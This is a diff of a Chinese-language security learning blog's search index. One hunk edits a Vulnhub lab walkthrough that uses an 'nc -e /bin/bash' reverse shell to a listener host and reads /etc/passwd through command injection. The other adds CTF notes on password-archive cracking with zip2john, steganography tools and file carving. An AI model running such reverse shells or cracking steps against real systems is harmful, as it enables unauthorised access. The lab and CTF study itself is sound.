@@ -1385,15 +1385,18 @@ handler 指向RequestHandler
 
 <p><img src="/2022/08/29/vulnhub/image-20220918204514149.png" alt="image-20220918204514149"></p>
 <p>发现是普通用户权限</p>
+<p>下面是两个<code>getshell</code>的思路</p>
 <hr>
-<p>后续查询操作，因为我们可以执行命令，所以也可以利用nc<strong>反弹shell</strong>，同样也可以找到用户目录信息</p>
+<p><strong>1.</strong></p>
+<p>后续查询操作，因为我们可以执行命令，所以也可以利用<code>nc</code><strong>反弹shell</strong>，同样也可以找到用户目录信息</p>
 <div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="CSS"><figure class="iseeu highlight /css"><table><tr><td class="code"><pre><span class="line">终端输入nc -l -vv -<span class="selector-tag">p</span> <span class="number">8888</span>，监听<span class="number">8888</span>端口</span><br></pre></td></tr></table></figure></div>
 
 <p>抓包数据命令修改为</p>
-<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="APACHE"><figure class="iseeu highlight /apache"><table><tr><td class="code"><pre><span class="line"><span class="attribute">nc</span> -nv <span class="number">192.168.133.140</span> <span class="number">8888</span> -e /bin/bash   //<span class="number">192</span>.<span class="number">168</span>.<span class="number">133</span>是虚拟机ip，不是靶机ip</span><br></pre></td></tr></table></figure></div>
+<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="AWK"><figure class="iseeu highlight /awk"><table><tr><td class="code"><pre><span class="line">nc -nv <span class="number">192.168</span>.<span class="number">133.140</span> <span class="number">8888</span> -e <span class="regexp">/bin/</span>bash   <span class="regexp">//</span><span class="number">192.168</span>.<span class="number">133.140</span>是虚拟机ip，不是靶机ip</span><br></pre></td></tr></table></figure></div>
 
 <p>然后终端就可以执行后续执行命令的类似操作，就是执行的时候可能稍微方便一些</p>
 <hr>
+<p><strong>2.</strong></p>
 <p>我们修改命令，查询<code>/etc/passwd</code>文档（记录每个用户的信息，方便管理员对用户的管理的一个文档）</p>
 <div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="ARCADE"><figure class="iseeu highlight /arcade"><table><tr><td class="code"><pre><span class="line">输入cat+<span class="regexp">/etc/</span>passwd</span><br></pre></td></tr></table></figure></div>
 
@@ -1617,6 +1620,137 @@ handler 指向RequestHandler
       <categories>
         <category>网络安全学习</category>
       </categories>
+  </entry>
+  <entry>
+    <title>密码+杂项题简单记录</title>
+    <url>/2022/09/27/crypto+misc/</url>
+    <content><![CDATA[<p><code>只会web，得分太少，还是搞点密码和杂项来提高一下</code></p>
+<span id="more"></span>
+
+<h2 id="1-一般加密"><a href="#1-一般加密" class="headerlink" title="1.一般加密"></a>1.一般加密</h2><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="EXCEL"><figure class="iseeu highlight /excel"><table><tr><td class="code"><pre><span class="line">直接用kali的</span><br><span class="line"></span><br><span class="line">ciphey -<span class="built_in">t</span> <span class="string">&quot;xxx&quot;</span></span><br></pre></td></tr></table></figure></div>
+
+
+
+<h2 id="2-SSTV声音题"><a href="#2-SSTV声音题" class="headerlink" title="2.SSTV声音题"></a>2.SSTV声音题</h2><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="GCODE"><figure class="iseeu highlight /gcode"><table><tr><td class="code"><pre><span class="line">用wi<span class="symbol">n10</span>上</span><br><span class="line"></span><br><span class="line">MMSSTV工具解析声音，最好用虚拟声卡这样可以屏蔽一些杂音【把声音给MMSSTV听】</span><br></pre></td></tr></table></figure></div>
+
+<h2 id="3-加密压缩包"><a href="#3-加密压缩包" class="headerlink" title="3.加密压缩包"></a>3.加密压缩包</h2><h3 id="1）win10"><a href="#1）win10" class="headerlink" title="*1）win10"></a>*1）win10</h3><p>用<code>win10</code>工具爆破压缩包密码</p>
+<h3 id="2）kali"><a href="#2）kali" class="headerlink" title="2）kali"></a>2）kali</h3><p><code>kali john</code>爆破压缩包</p>
+<figure class="highlight jboss-cli"><table><tr><td class="code"><pre><span class="line">zip2john 压缩包的名字<span class="string">.zip</span> &gt;&gt; passwdhash.txt</span><br></pre></td></tr></table></figure>
+
+
+
+<h2 id="4-图片隐写"><a href="#4-图片隐写" class="headerlink" title="4.图片隐写"></a>4.图片隐写</h2><h3 id="1）win10-1"><a href="#1）win10-1" class="headerlink" title="1）win10"></a>1）win10</h3><p>利用<code>Stegsolve</code>解析图片隐写内容</p>
+<h3 id="2）kali-1"><a href="#2）kali-1" class="headerlink" title="*2）kali"></a>*2）kali</h3><p><code>zsteg</code></p>
+<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="NGINX"><figure class="iseeu highlight /nginx"><table><tr><td class="code"><pre><span class="line"><span class="attribute">zsteg</span> 图片</span><br></pre></td></tr></table></figure></div>
+
+
+
+<h2 id="5-零宽字符隐写"><a href="#5-零宽字符隐写" class="headerlink" title="5.零宽字符隐写"></a>5.零宽字符隐写</h2><p><a href="http://330k.github.io/misc_tools/unicode_steganography.html">http://330k.github.io/misc_tools/unicode_steganography.html</a></p>
+<p>我们开始看这个内容是没有什么问题的，但是底下的</p>
+<p><code>第7行，第204列</code></p>
+<p>说明里面有其他我们无法看到的字符存在</p>
+<p><img src="/2022/09/27/crypto+misc/image-20220927160630959.png" alt="image-20220927160630959"></p>
+<p>我们可以利用<code>vim</code>读取一下这个文本文件，就会发现里面多了很多奇奇怪怪的字符</p>
+<p><img src="/2022/09/27/crypto+misc/image-20220927160526722.png" alt="image-20220927160526722"></p>
+<p>这些就是<code>零宽字符</code></p>
+<p>那么我们如何从中读取信息呢</p>
+<p>这里就需要下面这个网站的，对文本的<code>零宽字符加密</code>和<code>零宽字符解密</code>功能</p>
+<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="AWK"><figure class="iseeu highlight /awk"><table><tr><td class="code"><pre><span class="line">http:<span class="regexp">//</span><span class="number">330</span>k.github.io<span class="regexp">/misc_tools/u</span>nicode_steganography.html</span><br></pre></td></tr></table></figure></div>
+
+<p>先选好出现的字符类型</p>
+<p><img src="/2022/09/27/crypto+misc/image-20220927161233239.png" alt="image-20220927161233239"></p>
+<p>然后</p>
+<p><img src="/2022/09/27/crypto+misc/image-20220927161257809.png" alt="image-20220927161257809"></p>
+<p>得到隐藏内容</p>
+<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="GCODE"><figure class="iseeu highlight /gcode"><table><tr><td class="code"><pre><span class="line"><span class="number">86</span>MygAZ<span class="number">2</span>uJi<span class="number">2</span>oCxctsd<span class="number">28</span>LB<span class="symbol">NRXHPLykF5</span>LBz<span class="number">8</span>f<span class="number">1</span>xEikW<span class="symbol">NVpKfpce2</span>CMHvhSJUdk<span class="number">7</span>CHLrEVhGRVQvMwT<span class="number">8</span>r<span class="number">7</span>JUgVWGb<span class="symbol">nzxb</span></span><br></pre></td></tr></table></figure></div>
+
+<p>用<code>ciphey</code> 得到<code>flag</code></p>
+<p><img src="/2022/09/27/crypto+misc/image-20220927161352763.png" alt="image-20220927161352763"></p>
+<h2 id="6-隐藏秘密-flag-到图片、音乐"><a href="#6-隐藏秘密-flag-到图片、音乐" class="headerlink" title="6.隐藏秘密(flag)到图片、音乐"></a>6.隐藏秘密(flag)到图片、音乐</h2><h3 id="win10"><a href="#win10" class="headerlink" title="win10"></a>win10</h3><p><code>Silenteye</code></p>
+<p><img src="/2022/09/27/crypto+misc/image-20220927162235740.png" alt="image-20220927162235740"></p>
+<p>把图片或者声音拖入其中</p>
+<p><img src="/2022/09/27/crypto+misc/image-20220927162311232.png" alt="image-20220927162311232"></p>
+<p>然后执行<code>Decode</code></p>
+<p><img src="/2022/09/27/crypto+misc/image-20220927162351939.png" alt="image-20220927162351939"></p>
+<p>得到加密信息</p>
+<p>用<code>ciphey</code> 得到<code>flag</code></p>
+<p><img src="/2022/09/27/crypto+misc/image-20220927162441904.png" alt="image-20220927162441904"></p>
+<h2 id="7-小游戏"><a href="#7-小游戏" class="headerlink" title="7.小游戏"></a>7.小游戏</h2><h3 id="win10-1"><a href="#win10-1" class="headerlink" title="win10"></a>win10</h3><p><code>CE修改器，懂得都懂</code></p>
+<h2 id="8-Java类的"><a href="#8-Java类的" class="headerlink" title="8.Java类的"></a>8.Java类的</h2><p>利用<code>jd-gui</code>对java反汇编，看看有没有信息</p>
+<h2 id="9-二维码"><a href="#9-二维码" class="headerlink" title="9.二维码"></a>9.二维码</h2><h3 id="1）缺少定位点"><a href="#1）缺少定位点" class="headerlink" title="1）缺少定位点"></a>1）缺少定位点</h3><p><img src="/2022/09/27/crypto+misc/image-20220927163933448.png" alt="image-20220927163933448"></p>
+<p>利用<code>ps</code>把两者拼接起来就可以了</p>
+<h2 id="10-分离图片中的隐藏文件"><a href="#10-分离图片中的隐藏文件" class="headerlink" title="10.分离图片中的隐藏文件"></a>10.分离图片中的隐藏文件</h2><p><a href="https://blog.csdn.net/qq_43531669/article/details/113732757">原文链接</a></p>
+<h3 id="1）图片分析"><a href="#1）图片分析" class="headerlink" title="1）图片分析:"></a>1）图片分析:</h3><p>如图为CTF题目中一个隐藏文件的图片</p>
+<p>首先对图片进行分析，这里介绍一个工具binwalk（kali中是自带的，也可以下载到windows中使用）。</p>
+<p>使用方法：binwalk + 文件路径/文件名</p>
+<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="APACHE"><figure class="iseeu highlight /apache"><table><tr><td class="code"><pre><span class="line"><span class="attribute">binwalk</span> <span class="number">1</span>.jpg</span><br></pre></td></tr></table></figure></div>
+
+<p>执行命令后，binwalk就会自动分析这个jpg文件：</p>
+<p><img src="/2022/09/27/crypto+misc/image-20220927165710470.png" alt="image-20220927165710470"></p>
+<p>从分析的结果看，这个jpg文件隐藏着一个zip文件，从48221块偏移开始就是zip文件。</p>
+<h3 id="2、如何分离："><a href="#2、如何分离：" class="headerlink" title="2、如何分离："></a>2、如何分离：</h3><p>在得到隐藏信息后，改如何把zip文件分离出，下面介绍几种方法：</p>
+<h4 id="2-1、binwalk-分离："><a href="#2-1、binwalk-分离：" class="headerlink" title="2.1、binwalk 分离："></a>2.1、binwalk 分离：</h4><p>还是使用binwalk工具，使用dd命令分离出隐藏文件：</p>
+<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="ROUTEROS"><figure class="iseeu highlight /routeros"><table><tr><td class="code"><pre><span class="line">dd <span class="attribute">if</span>=1.jpg <span class="attribute">of</span>=1.zip <span class="attribute">skip</span>=48221 <span class="attribute">bs</span>=1</span><br></pre></td></tr></table></figure></div>
+
+
+<p>解释：if 指定输入文件，of 指定输出文件，skip 指定从输入文件开头跳过48221个块后开始复制，bs设<br>置每次读写块的大小为1字节</p>
+<p>执行后会得到一个1.zip文件。</p>
+<p><img src="/2022/09/27/crypto+misc/image-20220927165740304.png" alt="image-20220927165740304"></p>
+<h4 id="2-2、foremost-工具分离："><a href="#2-2、foremost-工具分离：" class="headerlink" title="2.2、foremost 工具分离："></a>2.2、foremost 工具分离：</h4><p>foremost是一个基于文件文件头和尾部信息以及文件的内建数据结构恢复文件的命令行工具，win可以下载使用，Linux可以通过下面命令安装使用：</p>
+<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="ROUTEROS"><figure class="iseeu highlight /routeros"><table><tr><td class="code"><pre><span class="line">apt-<span class="built_in">get</span> install foremost</span><br></pre></td></tr></table></figure></div>
+
+
+<p>Linux下分离文件的命令为：</p>
+<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="APACHE"><figure class="iseeu highlight /apache"><table><tr><td class="code"><pre><span class="line"><span class="attribute">foremost</span> <span class="number">1</span>.jpg</span><br></pre></td></tr></table></figure></div>
+
+
+<p>执行命令后，foremost会生成output目录存放分离出的文件。</p>
+<p>Win下是把文件直接拖到 foremost.exe上，也会生成output目录存放分离出的文件。</p>
+<p><img src="/2022/09/27/crypto+misc/image-20220927165802749.png" alt="image-20220927165802749"></p>
+<h4 id="2-3、hex编辑器分离："><a href="#2-3、hex编辑器分离：" class="headerlink" title="2.3、hex编辑器分离："></a>2.3、hex编辑器分离：</h4><p>hex编辑器有很多，win下有用得较多的winhex、UltraEdit等，linux下有hexeditor等。这里我们以winhex为例来手动分离。</p>
+<p>一个完整的 jpg 文件由 FF D8 开头，FF D9结尾，图片查看器会忽略 FF D9 以后的内容，因此可以在 jpg 文件中加入其他文件。</p>
+<p>经过上面的分析， 知道图片中隐藏了zip文件，zip文件的开头16进制为504B0304，先搜索16进制文本 FFD9，然后后面跟着504B0304，于是就可以从 50 开始，复制到最后（因为这里只有一个zip，所以复制到最后），另存为新文件，就得到了隐藏的压缩包。</p>
+<p><img src="/2022/09/27/crypto+misc/image-20220927165829838.png" alt="image-20220927165829838"></p>
+<p><img src="/2022/09/27/crypto+misc/image-20220927165845340.png" alt="image-20220927165845340"></p>
+<p><img src="/2022/09/27/crypto+misc/image-20220927165911140.png" alt="image-20220927165911140"></p>
+<h4 id="2-4、改后缀名："><a href="#2-4、改后缀名：" class="headerlink" title="2.4、改后缀名："></a>2.4、改后缀名：</h4><p>分析知道隐藏文件是zip后，有一个简单粗暴的方法是直接把图片的后缀改为.zip，然后解压即可（这种方法虽然简单快速，但如果隐写了多个文件时可能会失败）。</p>
+<h2 id="11-多图片拼图"><a href="#11-多图片拼图" class="headerlink" title="11.多图片拼图"></a>11.多图片拼图</h2><p><a href="https://blog.csdn.net/m0_62291930/article/details/124139016">原文链接</a></p>
+<p>Misc 自动拼图<br>需要使用<code>python</code>遗传算法脚本<code>gaps</code>和拼图脚本<code>montage</code></p>
+<p>开始拼图<br>以ctf中的一道训练题puzzle为例</p>
+<p>如果图片为碎片状，根据总数确定拼块长宽数量，并用montage进行第一次拼接</p>
+<p><img src="/2022/09/27/crypto+misc/image-20220927171241532.png" alt="image-20220927171241532"></p>
+<figure class="highlight 1c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#如左下角所示，总数为256块，即图片以16×16拆分而成的（要在拼块目录下运行命令），</span></span><br><span class="line"><span class="meta">#*.png为拼块格式，16×16为长宽数量，flag.png为合成后的图片名</span></span><br></pre></td></tr></table></figure>
+
+<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="APACHE"><figure class="iseeu highlight /apache"><table><tr><td class="code"><pre><span class="line"><span class="attribute">montage</span> *.png -tile <span class="number">16</span>x16 -geometry +<span class="number">0</span>+<span class="number">0</span> flag.png   </span><br></pre></td></tr></table></figure></div>
+
+
+
+<p>运行后在目录下可找到如下图片</p>
+<p><img src="/2022/09/27/crypto+misc/image-20220927171709538.png" alt="image-20220927171709538"></p>
+<p>运行后在目录下可找到如下图片</p>
+<p><strong>接着最关键的一点，调整图片长宽比为1：1，可以用PS-&gt;图像大小，以较大数值为边长，扩充为正方形（方便后续size的计算），否则后期gaps无法获得最佳效果</strong></p>
+<p><img src="/2022/09/27/crypto+misc/image-20220927171907186.png" alt="image-20220927171907186"></p>
+<p><img src="/2022/09/27/crypto+misc/image-20220927171924733.png" alt="image-20220927171924733"></p>
+<p>接下来就是调用gaps脚本实现自动拼图排序<strong>（重点）</strong></p>
+<p><img src="/2022/09/27/crypto+misc/image-20220927171940838.png" alt="image-20220927171940838"></p>
+<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="ROUTEROS"><figure class="iseeu highlight /routeros"><table><tr><td class="code"><pre><span class="line"><span class="comment">#此处的size为正方形小拼块的边长像素，由于刚刚经过拉伸，拼块从160×100变成了160×160</span></span><br><span class="line">gaps <span class="attribute">--image</span>=flag.png <span class="attribute">--size</span>=160 --save     </span><br></pre></td></tr></table></figure></div>
+
+<p><img src="/2022/09/27/crypto+misc/image-20220927171957840.png" alt="image-20220927171957840"></p>
+<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="MAXIMA"><figure class="iseeu highlight /maxima"><table><tr><td class="code"><pre><span class="line">补充：gaps各参数的作用</span><br><span class="line"></span><br><span class="line">–<span class="built_in">image</span> 指向拼图的路径</span><br><span class="line">–size 拼图块的像素尺寸</span><br><span class="line">–generations 遗传算法的代的数量</span><br><span class="line">–population 个体数量</span><br><span class="line">–<span class="built_in">verbose</span> 每一代训练结束后展示最佳结果</span><br><span class="line">–<span class="built_in">save</span> 将拼图还原为图像</span><br></pre></td></tr></table></figure></div>
+
+
+
+<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="MEL"><figure class="iseeu highlight /mel"><table><tr><td class="code"><pre><span class="line">总结</span><br><span class="line">最有挑战性的地方莫过于安装gaps和对gaps参数的把握，特别是sized的计算,需要先使图片的拼块恰好为像素最大的一条边的正方形，<span class="keyword">size</span>=该边长像素。另外，pip和<span class="keyword">python</span>库要提前安装完毕</span><br></pre></td></tr></table></figure></div>
+
+]]></content>
+      <categories>
+        <category>网络安全学习</category>
+      </categories>
+  </entry>
+  <entry>
+    <title></title>
+    <url>/2022/09/27/Untitled/</url>
+    <content><![CDATA[]]></content>
   </entry>
   <entry>
     <title>个人生活琐事</title>
